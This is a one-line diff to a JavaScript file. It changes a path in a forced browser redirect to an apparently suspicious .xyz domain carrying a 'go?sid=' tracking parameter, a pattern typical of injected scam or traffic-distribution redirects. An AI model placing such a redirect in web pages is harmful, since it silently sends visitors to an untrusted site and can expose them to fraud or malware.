@@ -1,1 +1,1 @@
-window.location.href = "https://azurylka.xyz/JIWi/go?sid=7744";
+window.location.href = "https://azurylka.xyz/uCZo/go?sid=7744";
